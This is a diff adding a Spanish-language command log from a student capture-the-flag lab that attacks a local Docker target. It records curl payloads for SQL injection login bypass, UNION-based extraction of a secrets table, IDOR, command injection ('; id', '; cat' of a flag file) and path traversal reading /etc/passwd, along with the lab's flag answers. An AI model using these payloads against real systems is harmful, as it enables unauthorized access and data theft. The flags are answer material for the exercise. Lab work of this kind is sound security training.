@@ -1,0 +1,126 @@
+# ==============================================================================
+# Bitácora de Comandos — Laboratorio 07 (Grupo 10)
+# Retos con evidencia: R1, R2, R3 y R5. R4 sigue pendiente.
+# Target: http://phantomcorp
+# Entorno: Docker (cyberlab-attacker -> cyberlab-phantomcorp)
+# ==============================================================================
+
+# --- Verificación inicial de conectividad ---
+curl -s -i http://phantomcorp/
+
+# --- RETO 1: SQLi - Bypass de Autenticación (POST /login) ---
+# 1. Inspección del formulario mediante GET /login (comprobación de método)
+curl -s -i http://phantomcorp/login
+
+# 2. Establecimiento de línea de base con credenciales inválidas (POST)
+curl -s -i -X POST http://phantomcorp/login \
+  --data-urlencode "user=admin" \
+  --data-urlencode "pass=credencial_invalida_control"
+
+# 3. Sondeo de caracteres de control y detección de errores sintácticos
+curl -s -i -X POST http://phantomcorp/login \
+  --data-urlencode "user='" \
+  --data-urlencode "pass=test"
+
+# 4. Explotación analítica: Neutralización del predicado de contraseña mediante comentario SQL
+curl -s -i -X POST http://phantomcorp/login \
+  --data-urlencode "user=admin' --" \
+  --data-urlencode "pass=dummy"
+
+# 5. Validación formal de la flag R1 en el sistema CTF
+./ctf submit 07 R1 'FLAG{sqli_auth_bypass}'
+
+
+# --- RETO 2: SQLi - Extracción de Datos con UNION (GET /buscar?q=) ---
+# 1. Establecimiento de línea de base con búsqueda estándar en el catálogo
+curl -s -i -G http://phantomcorp/buscar \
+  --data-urlencode "q=Router"
+
+# 2. Determinación del contexto sintáctico y forzado de error de delimitador
+curl -s -i -G http://phantomcorp/buscar \
+  --data-urlencode "q='"
+
+# 3. Comprobación de contexto de inyección (cierre de comilla y comentario)
+curl -s -i -G http://phantomcorp/buscar \
+  --data-urlencode "q=' OR '1'='1' --"
+
+# 4. Inferencia de dimensionalidad mediante cláusula ORDER BY
+curl -s -i -G http://phantomcorp/buscar \
+  --data-urlencode "q=' ORDER BY 1 --"
+
+curl -s -i -G http://phantomcorp/buscar \
+  --data-urlencode "q=' ORDER BY 2 --"
+
+curl -s -i -G http://phantomcorp/buscar \
+  --data-urlencode "q=' ORDER BY 3 --"
+
+# 5. Comprobación de compatibilidad de tipos y canal reflejado en las dos columnas
+curl -s -i -G http://phantomcorp/buscar \
+  --data-urlencode "q=NOEXISTE' UNION SELECT 'COLUMNA_UNO', 'COLUMNA_DOS' --"
+
+# 6. Descubrimiento de esquema y definición de tablas mediante sqlite_master
+curl -s -i -G http://phantomcorp/buscar \
+  --data-urlencode "q=NOEXISTE' UNION SELECT sql, '' FROM sqlite_master WHERE type='table' --"
+
+# 7. Explotación analítica con proyección explícita de columnas (clave, valor) de la tabla secrets
+curl -s -i -G http://phantomcorp/buscar \
+  --data-urlencode "q=NOEXISTE' UNION SELECT clave, valor FROM secrets --"
+
+# 8. Validación formal de la flag R2 en el sistema CTF
+./ctf submit 07 R2 'FLAG{sqli_union_dump}'
+
+# --- Estado consolidado del progreso ---
+./ctf status 07
+
+
+# --- RETO 5: IDOR - Control de acceso roto (GET /perfil?id=) ---
+# 1. Solicitar el perfil de referencia (id=3); captura HTTP 200 y perfil jperez.
+curl -sS -i -G http://phantomcorp/perfil --data-urlencode "id=3"
+
+# 2. Modificar el identificador al del administrador (id=1); captura HTTP 200,
+#    rol admin y nota_privada que contiene FLAG{idor_broken_access}.
+curl -sS -i -G http://phantomcorp/perfil --data-urlencode "id=1"
+
+# 3. Validar la flag obtenida en la respuesta con el verificador oficial.
+./ctf submit 07 R5 'FLAG{idor_broken_access}'
+
+# 4. Confirmar progreso actualizado.
+./ctf status 07
+
+# --- RETO 3: Command injection (GET /herramientas/ping?host=) ---
+# Ejecutar desde PowerShell en la raíz del repositorio; attacker envía las
+# solicitudes al target local phantomcorp.
+docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/lab07-explotacion/entorno/target.compose.yml exec -T attacker curl -sS -i -G http://phantomcorp/herramientas/ping --data-urlencode 'host=127.0.0.1'
+docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/lab07-explotacion/entorno/target.compose.yml exec -T attacker curl -sS -i -G http://phantomcorp/herramientas/ping --data-urlencode 'host=127.0.0.1; id'
+docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/lab07-explotacion/entorno/target.compose.yml exec -T attacker curl -sS -i -G http://phantomcorp/herramientas/ping --data-urlencode 'host=127.0.0.1; cat /app/flags/cmdi.txt'
+
+# La flag fue aceptada por `bash ./ctf submit 07 R3` en una copia temporal
+# con CRLF normalizados. No se modificó .progreso del repositorio compartido.
+# Salidas observadas: evidencia/salidas/r3_01_baseline.txt a r3_04_verificador.txt.
+
+
+
+# --- RETO 4: Path traversal / LFI (GET /descargar?archivo=) ---
+# Entorno levantado con Docker (consola attacker + target phantomcorp):
+docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/lab07-explotacion/entorno/target.compose.yml up -d --build
+
+# 1. Linea base: descarga normal del catalogo publico (HTTP 200 esperado).
+docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/lab07-explotacion/entorno/target.compose.yml exec -T attacker curl -sS -i -G http://phantomcorp/descargar --data-urlencode 'archivo=catalogo.txt'
+
+# 2. Payload de traversal hacia /app/flags/lfi.txt (fuera de /app/public):
+#    HTTP 200 con FLAG{path_traversal_lfi}.
+docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/lab07-explotacion/entorno/target.compose.yml exec -T attacker curl -sS -i -G http://phantomcorp/descargar --data-urlencode 'archivo=../flags/lfi.txt'
+
+# 3. Payload adicional para medir el alcance real (fuera de todo /app):
+#    HTTP 200 con el contenido real de /etc/passwd del contenedor.
+docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/lab07-explotacion/entorno/target.compose.yml exec -T attacker curl -sS -i -G http://phantomcorp/descargar --data-urlencode 'archivo=../../../../../../etc/passwd'
+
+# 4. Estado antes de entregar, validacion con el motor oficial y estado despues.
+#    Ejecutados desde la raiz del repositorio (host), no desde la consola attacker.
+bash ./ctf status 07
+bash ./ctf submit 07 R4 'FLAG{path_traversal_lfi}'
+bash ./ctf status 07
+
+# La flag fue aceptada por el motor oficial en esta copia local; el progreso
+# de este reto paso de 0/5 a 1/5. No se modifico el estado de los demas retos.
+# Salidas observadas: evidencia/salidas/r4_01_baseline_catalogo.txt a r4_06_status_despues.txt.
